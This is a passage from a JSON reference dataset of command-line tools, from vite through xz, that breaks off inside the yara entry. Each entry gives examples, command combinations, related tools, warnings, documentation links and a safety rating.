      "vite --config vite.config.ts  # Use specific configuration file",
      "vite --port 3000  # Start development server on port 3000"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "vite [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete development workflow",
        "commands": "vite --open --port 3000 && vite build && vite preview",
        "explanation": "Develop, build, and preview application",
        "title": "vite && vite && vite"
      },
      {
        "scenario": "Production deployment pipeline",
        "commands": "vite build --mode production && vite preview --port 4173",
        "explanation": "Build for production and preview on specific port",
        "title": "vite && vite"
      }
    ],
    "relatedCommands": [
      {
        "name": "webpack",
        "relationship": "alternative",
        "reason": "Traditional bundler with more configuration"
      },
      {
        "name": "parcel",
        "relationship": "similar",
        "reason": "Zero-config bundler alternative"
      },
      {
        "name": "rollup",
        "relationship": "combo",
        "reason": "Vite uses Rollup for production builds"
      }
    ],
    "warnings": [
      "ES modules in development vs bundled production",
      "Plugin compatibility differs from Webpack",
      "Some legacy dependencies may not work in dev mode"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://vitejs.dev/"
      },
      {
        "platform": "macos",
        "url": "https://vitejs.dev/"
      },
      {
        "platform": "windows",
        "url": "https://vitejs.dev/"
      },
      {
        "platform": "generic",
        "url": "https://vitejs.dev/guide/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "vmstat",
    "subtitle": "Virtual Memory Statistics",
    "description": "Report virtual memory, process, and CPU statistics",
    "examples": [
      "vmstat  # Show current virtual memory and CPU statistics",
      "vmstat 5 12  # Display statistics every 5 seconds for 12 iterations",
      "vmstat -s  # Display detailed memory statistics",
      "vmstat -d  # Show disk I/O statistics",
      "vmstat -a  # Show active and inactive memory",
      "vmstat -m  # Display kernel slab allocator information"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "vmstat [options] [interval] [count]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Memory pressure analysis",
        "commands": "vmstat 1 10 && free -h && cat /proc/meminfo | grep -E '(MemTotal|MemFree|Buffers|Cached)'",
        "explanation": "Comprehensive memory analysis with multiple tools",
        "title": "vmstat && free && cat | grep | MemFree | Buffers | Cached"
      }
    ],
    "relatedCommands": [
      {
        "name": "iostat",
        "relationship": "complementary",
        "reason": "iostat focuses on I/O statistics"
      },
      {
        "name": "free",
        "relationship": "similar",
        "reason": "free shows memory usage in different format"
      }
    ],
    "warnings": [
      "First line shows averages since boot",
      "Swap in/out columns indicate memory pressure",
      "High 'wa' (wait) values indicate I/O bottlenecks"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/vmstat.8.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/vmstat.html"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "volatility",
    "subtitle": "Volatility",
    "description": "Advanced memory forensics framework for incident response",
    "examples": [
      "volatility -f memory.dmp imageinfo  # Determine the correct profile for memory dump analysis",
      "volatility -f memory.dmp --profile=Win7SP1x64 pslist  # Extract process list from memory dump",
      "volatility -f memory.dmp --profile=Win7SP1x64 connections  # Show active network connections at time of capture",
      "volatility -f memory.dmp --profile=Win7SP1x64 procdump -p 1234 -D ./  # Extract executable from memory for analysis"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "volatility -f <memory-dump> --profile=<profile> <plugin>",
    "prerequisites": [
      "expert"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete memory analysis workflow",
        "commands": "volatility -f memory.dmp imageinfo && volatility -f memory.dmp --profile=Win7SP1x64 pslist && volatility -f memory.dmp --profile=Win7SP1x64 malfind",
        "explanation": "Profile identification, process listing, and malware detection",
        "title": "volatility && volatility && volatility"
      }
    ],
    "relatedCommands": [
      {
        "name": "rekall",
        "relationship": "similar",
        "reason": "Alternative memory forensics framework"
      },
      {
        "name": "yara",
        "relationship": "combo",
        "reason": "Pattern matching in memory analysis"
      }
    ],
    "warnings": [
      "Profile must match exactly for accurate analysis",
      "Large memory dumps require significant processing time",
      "Some plugins may not work with all Windows versions"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://volatilityfoundation.org/documentation"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "vue",
    "subtitle": "Vue CLI",
    "description": "Vue.js CLI for creating and managing Vue applications",
    "examples": [
      "vue create my-project  # Create new Vue application with interactive setup",
      "vue-cli-service serve  # Start development server with hot reload",
      "vue-cli-service build  # Build optimized production bundle",
      "vue add router  # Add Vue Router plugin to existing project",
      "vue create --preset default my-app  # Create project using default preset configuration",
      "vue ui  # Launch browser-based project management interface"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "vue <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Setup PWA project",
        "commands": "vue create my-pwa && cd my-pwa && vue add pwa",
        "explanation": "Create project and add Progressive Web App features",
        "title": "vue && cd && vue"
      }
    ],
    "relatedCommands": [
      {
        "name": "npm",
        "relationship": "combo",
        "reason": "Vue CLI is installed and managed via npm"
      },
      {
        "name": "vite",
        "relationship": "alternative",
        "reason": "Vite is modern alternative for Vue development"
      }
    ],
    "warnings": [
      "Vue CLI 3+ has different structure than Vue CLI 2",
      "vue-cli-service commands must be run in project directory",
      "Plugin system can modify project structure significantly"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://cli.vuejs.org/guide/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "watch",
    "subtitle": "watch",
    "description": "Execute command repeatedly and display output",
    "examples": [
      "watch 'ps aux | head -20'  # Update process list every 2 seconds (default interval)",
      "watch -n 1 'ls -la /tmp'  # Monitor directory contents every 1 second",
      "watch df -h  # Track filesystem usage in real-time",
      "watch -d 'netstat -tuln'  # Show network connections and highlight changes",
      "watch 'wc -l /var/log/syslog'  # Watch line count increase in system log",
      "watch -e 'ping -c 1 google.com'  # Stop watching when ping command fails"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "watch [options] <command>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Monitor service status",
        "commands": "watch -n 5 'systemctl status nginx && echo \"---\" && tail -5 /var/log/nginx/error.log'",
        "explanation": "Check nginx status and recent errors every 5 seconds",
        "title": "watch && echo && tail"
      },
      {
        "scenario": "Track build progress",
        "commands": "watch -n 2 'ls -la build/ | wc -l && du -sh build/'",
        "explanation": "Monitor build directory file count and size",
        "title": "watch | wc && du"
      }
    ],
    "relatedCommands": [
      {
        "name": "tail",
        "relationship": "similar",
        "reason": "tail -f watches file changes, watch monitors any command"
      },
      {
        "name": "top",
        "relationship": "alternative",
        "reason": "top continuously updates, watch runs any command repeatedly"
      },
      {
        "name": "while",
        "relationship": "alternative",
        "reason": "Shell while loop can provide similar functionality"
      }
    ],
    "warnings": [
      "Command output truncated to terminal size",
      "Complex commands need proper shell quoting",
      "High frequency updates can consume CPU"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/watch.1.html"
      },
      {
        "platform": "macos",
        "url": "https://www.cyberciti.biz/faq/linux-bsd-appleosx-watch-command/"
      },
      {
        "platform": "generic",
        "url": "https://www.cyberciti.biz/faq/watch-command-in-linux-unix/"
      }
    ],
    "distroNotes": {
      "macos": "Install via Homebrew: brew install watch",
      "windows": "Available in WSL"
    }
  },
  {
    "name": "wc",
    "subtitle": "word count",
    "description": "Count lines, words, and characters in files",
    "examples": [
      "wc -l file.txt  # Show only the number of lines",
      "wc -w document.txt  # Show only the word count",
      "wc -c file.txt  # Show byte count of file",
      "wc file.txt  # Show lines, words, and bytes (default output)",
      "wc *.txt  # Show counts for all text files plus totals"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "wc [options] [file]...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Count unique lines in file",
        "commands": "sort file.txt | uniq | wc -l",
        "explanation": "Count number of unique lines",
        "title": "sort | uniq | wc"
      },
      {
        "scenario": "Monitor log file growth",
        "commands": "watch 'wc -l /var/log/syslog'",
        "explanation": "Watch line count change in real-time",
        "title": "watch"
      }
    ],
    "relatedCommands": [
      {
        "name": "du",
        "relationship": "similar",
        "reason": "Both provide file/directory statistics"
      },
      {
        "name": "grep",
        "relationship": "combo",
        "reason": "Count matches with grep -c or grep | wc -l"
      },
      {
        "name": "find",
        "relationship": "combo",
        "reason": "Count files with find | wc -l"
      }
    ],
    "warnings": [
      "wc -c counts bytes, wc -m counts characters (differs with Unicode)",
      "Empty files show 0 lines but files without trailing newline may surprise",
      "Word definition is whitespace-separated tokens"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/wc.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/wc.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/wc-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL or Git Bash"
    }
  },
  {
    "name": "webpack",
    "subtitle": "Web Package",
    "description": "Module bundler for JavaScript applications",
    "examples": [
      "webpack  # Bundle application using webpack.config.js",
      "webpack --mode production  # Create optimized production bundle",
      "webpack serve --mode development  # Start development server with hot reloading",
      "webpack --watch  # Rebuild automatically when files change",
      "webpack-bundle-analyzer dist/main.js  # Visualize bundle size and composition",
      "webpack --config webpack.prod.js  # Build using custom configuration file"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "webpack [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development workflow",
        "commands": "webpack serve --mode development --open",
        "explanation": "Start dev server and open browser automatically",
        "title": "webpack"
      },
      {
        "scenario": "Production build with analysis",
        "commands": "webpack --mode production && webpack-bundle-analyzer dist/main.js",
        "explanation": "Build for production then analyze bundle",
        "title": "webpack && webpack"
      }
    ],
    "relatedCommands": [
      {
        "name": "rollup",
        "relationship": "alternative",
        "reason": "Alternative module bundler focused on ES modules"
      },
      {
        "name": "vite",
        "relationship": "alternative",
        "reason": "Modern build tool with faster development server"
      },
      {
        "name": "babel",
        "relationship": "combo",
        "reason": "Often used together for JavaScript transpilation"
      }
    ],
    "warnings": [
      "Configuration can become complex quickly",
      "Dev server and production builds may behave differently",
      "Plugin ecosystem requires careful version management"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://webpack.js.org/"
      },
      {
        "platform": "macos",
        "url": "https://webpack.js.org/"
      },
      {
        "platform": "windows",
        "url": "https://webpack.js.org/"
      },
      {
        "platform": "generic",
        "url": "https://webpack.js.org/guides/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "wget",
    "subtitle": "web get",
    "description": "Download files from web servers",
    "examples": [
      "wget https://example.com/file.pdf  # Download file to current directory",
      "wget -O report.pdf https://example.com/document.pdf  # Save downloaded file with specified name",
      "wget -c https://example.com/largefile.zip  # Continue previous download from where it stopped",
      "wget -r -np -k https://example.com/  # Recursively download website for offline viewing",
      "wget --limit-rate=100k https://example.com/file.iso  # Limit download speed to avoid bandwidth issues",
      "wget -i urls.txt  # Download all URLs listed in text file"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "caution",
    "syntaxPattern": "wget [options] <URL>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Mirror website with timestamps",
        "commands": "wget -m -np -N https://example.com/docs/",
        "explanation": "Mirror website, only download newer files",
        "title": "wget"
      },
      {
        "scenario": "Download and verify integrity",
        "commands": "wget https://example.com/file.tar.gz && sha256sum file.tar.gz",
        "explanation": "Download file and check its checksum",
        "title": "wget && sha256sum"
      }
    ],
    "relatedCommands": [
      {
        "name": "curl",
        "relationship": "alternative",
        "reason": "More versatile HTTP client with API support"
      },
      {
        "name": "aria2",
        "relationship": "alternative",
        "reason": "Multi-protocol download utility with parallel downloads"
      },
      {
        "name": "rsync",
        "relationship": "similar",
        "reason": "Better for syncing large directories"
      }
    ],
    "warnings": [
      "wget follows redirects by default (unlike curl)",
      "Can accidentally download entire websites if not careful with -r",
      "May be blocked by websites that detect automated downloading"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/wget.1.html"
      },
      {
        "platform": "macos",
        "url": "https://www.gnu.org/software/wget/manual/wget.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/wget/manual/"
      }
    ],
    "distroNotes": {
      "macos": "Install via Homebrew: brew install wget",
      "windows": "Available in WSL or via package managers"
    }
  },
  {
    "name": "which",
    "subtitle": "which",
    "description": "Locate command in PATH",
    "examples": [
      "which python  # Show full path to python executable",
      "which nonexistent-cmd  # Returns exit code 1 if command not found",
      "which -a python  # Show all python executables in PATH"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "which <command>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Conditional script execution",
        "commands": "which docker >/dev/null && docker --version || echo 'Docker not installed'",
        "explanation": "Check if docker exists before using it",
        "title": "which > && docker || echo"
      },
      {
        "scenario": "Compare command locations",
        "commands": "echo \"Python: $(which python)\" && echo \"Python3: $(which python3)\"",
        "explanation": "Show locations of different Python versions",
        "title": "echo && echo"
      }
    ],
    "relatedCommands": [
      {
        "name": "whereis",
        "relationship": "similar",
        "reason": "Also finds binaries, man pages, and source files"
      },
      {
        "name": "type",
        "relationship": "similar",
        "reason": "Shell builtin that shows command type and location"
      },
      {
        "name": "command -v",
        "relationship": "alternative",
        "reason": "POSIX-compliant way to find commands"
      }
    ],
    "warnings": [
      "which doesn't find shell builtins or functions",
      "May not work with aliases in some shells",
      "Results depend on current PATH environment"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/which.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/which.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/which/"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL; Windows has where command"
    }
  },
  {
    "name": "whoami",
    "subtitle": "who am I",
    "description": "Display current username",
    "examples": [
      "whoami  # Show the username of current user"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "whoami",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "User context in scripts",
        "commands": "echo \"Running as user: $(whoami)\" && id",
        "explanation": "Show current user and their group memberships",
        "title": "echo && id"
      },
      {
        "scenario": "Conditional execution based on user",
        "commands": "if [ $(whoami) = 'root' ]; then echo 'Running as root'; fi",
        "explanation": "Check if running as root user",
        "title": "if ; then ; fi"
      }
    ],
    "relatedCommands": [
      {
        "name": "id",
        "relationship": "similar",
        "reason": "Shows user ID and group information"
      },
      {
        "name": "who",
        "relationship": "similar",
        "reason": "Shows all logged-in users"
      },
      {
        "name": "w",
        "relationship": "similar",
        "reason": "Shows logged-in users and their activities"
      }
    ],
    "warnings": [
      "Shows effective user, not necessarily login user",
      "May show different results when using sudo",
      "Simple command with no options needed"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/whoami.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/whoami.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/whoami-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in PowerShell and WSL"
    }
  },
  {
    "name": "whois",
    "subtitle": "Who Is",
    "description": "Query domain registration and ownership information",
    "examples": [
      "whois google.com  # Get registration information for google.com",
      "whois 8.8.8.8  # Get information about IP address ownership",
      "whois -h whois.verisign-grs.com google.com  # Query specific whois server directly",
      "whois -R domain.com  # Don't follow referrals to other whois servers"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "whois [options] domain",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Domain investigation",
        "commands": "whois domain.com | grep -E '(Registrar|Creation Date|Expiry)' && dig +short domain.com",
        "explanation": "Get registration details and current IP",
        "title": "whois | grep | Creation | Expiry && dig"
      }
    ],
    "relatedCommands": [
      {
        "name": "dig",
        "relationship": "complementary",
        "reason": "dig provides DNS info, whois provides registration info"
      }
    ],
    "warnings": [
      "Information quality varies by registrar",
      "Privacy protection may hide contact details",
      "Rate limiting by whois servers"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/whois.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/whois.html"
      },
      {
        "platform": "windows",
        "url": "https://man7.org/linux/man-pages/man1/whois.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "wireshark",
    "subtitle": "Wire Shark",
    "description": "Network protocol analyzer and packet capture tool",
    "examples": [
      "wireshark  # Launch Wireshark GUI for interactive packet analysis",
      "wireshark capture.pcap  # Open existing packet capture file",
      "tshark -i eth0 -w capture.pcap  # Capture packets to file using command-line interface",
      "tshark -i eth0 -f 'tcp port 80'  # Capture only HTTP traffic in real-time",
      "tshark -r capture.pcap -Y 'http.request'  # Display only HTTP requests from capture file"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "wireshark [options] [capture-file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Network troubleshooting workflow",
        "commands": "tshark -i eth0 -w debug.pcap & sleep 60 && kill %1 && wireshark debug.pcap",
        "explanation": "Capture packets for 1 minute then analyze in GUI",
        "title": "tshark & sleep && kill && wireshark"
      }
    ],
    "relatedCommands": [
      {
        "name": "tcpdump",
        "relationship": "alternative",
        "reason": "Command-line packet capture alternative"
      },
      {
        "name": "tshark",
        "relationship": "component",
        "reason": "tshark is Wireshark's command-line interface"
      }
    ],
    "warnings": [
      "Requires elevated privileges for packet capture",
      "Can generate large capture files quickly",
      "Privacy concerns with packet capture"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.wireshark.org/docs/"
      },
      {
        "platform": "macos",
        "url": "https://www.wireshark.org/docs/"
      },
      {
        "platform": "windows",
        "url": "https://www.wireshark.org/docs/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "wkhtmltopdf",
    "subtitle": "WebKit HTML to PDF",
    "description": "Render HTML to PDF using WebKit engine",
    "examples": [
      "wkhtmltopdf https://example.com document.pdf  # Convert web page to PDF document",
      "wkhtmltopdf document.html document.pdf  # Convert local HTML file to PDF",
      "wkhtmltopdf --page-size A4 --orientation Portrait input.html output.pdf  # Create A4 portrait PDF from HTML",
      "wkhtmltopdf --header-center 'Document Title' --footer-right '[page]' input.html output.pdf  # Add custom header and page numbers",
      "wkhtmltopdf --margin-top 20mm --margin-bottom 20mm input.html output.pdf  # Set custom page margins",
      "wkhtmltopdf --disable-javascript input.html output.pdf  # Convert HTML without executing JavaScript"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "wkhtmltopdf [options] <input> <output>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Professional document conversion",
        "commands": "wkhtmltopdf --page-size A4 --margin-top 20mm --header-center 'Company Report' --footer-right '[page]/[topage]' report.html report.pdf",
        "explanation": "Create professional PDF with headers and page numbers",
        "title": "wkhtmltopdf"
      },
      {
        "scenario": "Batch convert HTML files",
        "commands": "for file in *.html; do wkhtmltopdf \"$file\" \"${file%.html}.pdf\"; done",
        "explanation": "Convert all HTML files in directory to PDF",
        "title": "for ; do ; done"
      }
    ],
    "relatedCommands": [
      {
        "name": "pandoc",
        "relationship": "alternative",
        "reason": "Pandoc can also convert HTML to PDF"
      },
      {
        "name": "chrome",
        "relationship": "alternative",
        "reason": "Chrome headless can print web pages to PDF"
      },
      {
        "name": "puppeteer",
        "relationship": "alternative",
        "reason": "Node.js library for PDF generation from HTML"
      }
    ],
    "warnings": [
      "JavaScript execution can affect rendering",
      "CSS print styles may behave differently",
      "Large pages may take significant processing time"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://wkhtmltopdf.org/usage/wkhtmltopdf.txt"
      },
      {
        "platform": "macos",
        "url": "https://wkhtmltopdf.org/usage/wkhtmltopdf.txt"
      },
      {
        "platform": "windows",
        "url": "https://wkhtmltopdf.org/usage/wkhtmltopdf.txt"
      },
      {
        "platform": "generic",
        "url": "https://wkhtmltopdf.org/downloads.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "wp",
    "subtitle": "WordPress CLI",
    "description": "WP-CLI command line interface for WordPress",
    "examples": [
      "wp core download  # Downloads latest WordPress core files to current directory",
      "wp core config --dbname=wordpress --dbuser=root --dbpass=password  # Generates WordPress configuration file with database settings",
      "wp core install --url=example.com --title='My Site' --admin_user=admin --admin_password=password --admin_email=admin@example.com  # Completes WordPress installation with specified parameters",
      "wp plugin install contact-form-7 --activate  # Downloads, installs, and activates Contact Form 7 plugin",
      "wp core update  # Updates WordPress to the latest version"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "wp [command] [subcommand] [options]",
    "prerequisites": [
      "php",
      "mysql-or-mariadb"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete WordPress setup",
        "commands": "wp core download && wp core config --dbname=wordpress --dbuser=root --dbpass=password && wp core install --url=example.com --title='My Site' --admin_user=admin --admin_password=password --admin_email=admin@example.com",
        "explanation": "Downloads WordPress, creates config, and completes installation",
        "title": "wp && wp && wp"
      },
      {
        "scenario": "Backup and update",
        "commands": "wp db export backup.sql && wp core update && wp plugin update --all",
        "explanation": "Creates database backup, updates WordPress core, and all plugins",
        "title": "wp && wp && wp"
      }
    ],
    "relatedCommands": [
      {
        "name": "mysql",
        "relationship": "dependency",
        "reason": "WordPress requires MySQL/MariaDB database for data storage"
      },
      {
        "name": "php",
        "relationship": "dependency",
        "reason": "WordPress and WP-CLI are built on PHP"
      },
      {
        "name": "composer",
        "relationship": "installer",
        "reason": "WP-CLI can be installed and managed via Composer"
      }
    ],
    "warnings": [
      "Must be run from WordPress installation directory",
      "Database credentials must be correct in wp-config.php",
      "File permissions may prevent certain operations",
      "Some commands require WordPress to be installed first"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://wp-cli.org/#installing"
      },
      {
        "platform": "macos",
        "url": "https://wp-cli.org/#installing"
      },
      {
        "platform": "windows",
        "url": "https://wp-cli.org/#installing"
      },
      {
        "platform": "generic",
        "url": "https://developer.wordpress.org/cli/commands/"
      }
    ],
    "distroNotes": {
      "windows": "Available through Composer or direct download, requires PHP",
      "linux": "Can be installed via package managers, Composer, or direct download",
      "macos": "Available through Homebrew, Composer, or direct download"
    }
  },
  {
    "name": "wrk",
    "subtitle": "Work",
    "description": "Modern HTTP benchmarking tool with scriptable load generation",
    "examples": [
      "wrk -t12 -c400 -d30s http://example.com/  # Run 30-second test with 12 threads and 400 connections",
      "wrk -t4 -c100 -d10s -s script.lua http://example.com/  # Use Lua script to customize request behavior",
      "wrk -t1 -c1 -d10s -R 10 http://example.com/  # Limit to 10 requests per second",
      "wrk -t4 -c50 -d30s -s post.lua http://api.example.com/  # Use script for POST requests with custom payloads"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "wrk [options] URL",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Progressive load testing",
        "commands": "wrk -t1 -c1 -d10s -R 1 http://example.com/ && wrk -t4 -c50 -d30s http://example.com/",
        "explanation": "Test with light load first, then increase",
        "title": "wrk && wrk"
      }
    ],
    "relatedCommands": [
      {
        "name": "ab",
        "relationship": "traditional-alternative",
        "reason": "Apache Bench is simpler but less flexible"
      },
      {
        "name": "hey",
        "relationship": "similar",
        "reason": "Another modern HTTP load testing tool"
      }
    ],
    "warnings": [
      "Lua scripting enables complex test scenarios",
      "Very efficient - can generate significant load",
      "Not available on Windows natively"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/wg/wrk"
      },
      {
        "platform": "macos",
        "url": "https://github.com/wg/wrk"
      },
      {
        "platform": "windows",
        "url": "Not available natively"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "xargs",
    "subtitle": "Extended Arguments",
    "description": "Build and execute command lines from standard input",
    "examples": [
      "find . -name '*.tmp' | xargs rm  # Find and delete temporary files",
      "find . -name '*.txt' | xargs -P 4 gzip  # Compress text files using 4 parallel processes",
      "find . -name '*.pdf' -print0 | xargs -0 cp -t backup/  # Copy PDF files handling spaces in names",
      "find . -name '*.log' | xargs -p rm  # Interactively confirm before deleting each file",
      "echo 'a,b,c' | xargs -d ',' echo  # Process comma-separated values",
      "seq 1 10 | xargs -n 3 echo  # Pass maximum 3 arguments per echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "automation",
    "safety": "dangerous",
    "syntaxPattern": "xargs [options] [command]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Clean old log files",
        "commands": "find /var/log -name '*.log' -mtime +30 | xargs -r gzip",
        "explanation": "Find and compress log files older than 30 days",
        "title": "find | xargs"
      }
    ],
    "relatedCommands": [
      {
        "name": "find",
        "relationship": "combo",
        "reason": "find is commonly piped to xargs for batch operations"
      },
      {
        "name": "parallel",
        "relationship": "parallel-alternative",
        "reason": "parallel provides better parallel processing capabilities"
      }
    ],
    "warnings": [
      "Use -0 with find -print0 for files with spaces",
      "Can run commands in parallel with -P option",
      "Essential for batch processing in Unix pipelines"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/xargs.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/xargs.html"
      },
      {
        "platform": "windows",
        "url": "PowerShell: ForEach-Object cmdlet"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "xelatex",
    "subtitle": "",
    "description": "Modern LaTeX engine with Unicode and advanced font support",
    "examples": [],
    "platform": [],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "",
    "prerequisites": [],
    "commandCombinations": [],
    "relatedCommands": [],
    "warnings": [],
    "documentation": [],
    "distroNotes": {}
  },
  {
    "name": "xz",
    "subtitle": "XZ Utils",
    "description": "High-ratio compression tool using LZMA algorithm",
    "examples": [
      "xz large-file.txt  # Compress file (creates large-file.txt.xz, removes original)",
      "xz -d archive.tar.xz  # Decompress file (same as unxz)",
      "xz -k document.pdf  # Create compressed version without deleting original",
      "xz -t backup.xz  # Verify file integrity without extracting",
      "xz -l archive.tar.xz  # Display compression statistics and file info"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "xz [options] <file>...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Create compressed tarball",
        "commands": "tar -cJf backup.tar.xz project/",
        "explanation": "Create tar archive with xz compression in one command",
        "title": "tar"
      },
      {
        "scenario": "Compare compression ratios",
        "commands": "cp large.txt test.txt && time gzip -k test.txt && time xz -k test.txt && ls -lh test.*",
        "explanation": "Compare gzip vs xz compression and speed",
        "title": "cp && time && time && ls"
      }
    ],
    "relatedCommands": [
      {
        "name": "gzip",
        "relationship": "alternative",
        "reason": "xz provides better compression but slower speed"
      },
      {
        "name": "bzip2",
        "relationship": "similar",
        "reason": "Another high-compression alternative to gzip"
      },
      {
        "name": "tar",
        "relationship": "combo",
        "reason": "tar -J uses xz compression for archives"
      }
    ],
    "warnings": [
      "Much slower than gzip but better compression",
      "Uses more memory than gzip during compression",
      "Not as widely supported as gzip on older systems"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/xz.1.html"
      },
      {
        "platform": "macos",
        "url": "https://tukaani.org/xz/"
      },
      {
        "platform": "generic",
        "url": "https://tukaani.org/xz/format.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL or as standalone binary"
    }
  },
  {
    "name": "yara",
    "subtitle": "Yet Another Recursive Acronym",
    "description": "Pattern matching engine for malware identification and classification",
    "examples": [
      "yara rules.yar suspicious_file.exe  # Scan file using YARA rules for malware detection",
      "yara -r malware_rules.yar /suspected/directory  # Recursively scan directory for malware patterns",
      "yara rules.yar 1234  # Scan running process memory for malware signatures",
      "yarac rules.yar compiled_rules.yarc  # Compile YARA rules for improved performance"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "yara [options] <rules-file> <target>",
    "prerequisites": [
      "advanced"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive malware analysis",
        "commands": "yarac malware_rules.yar compiled.yarc && yara compiled.yarc -r /home/user/Downloads",
        "explanation": "Compile rules and scan downloads directory",
        "title": "yarac && yara"
      }
    ],
    "relatedCommands": [
      {
        "name": "clamav",
        "relationship": "combo",
        "reason": "Complementary malware detection approaches"
      },
      {
        "name": "rkhunter",
        "relationship": "combo",
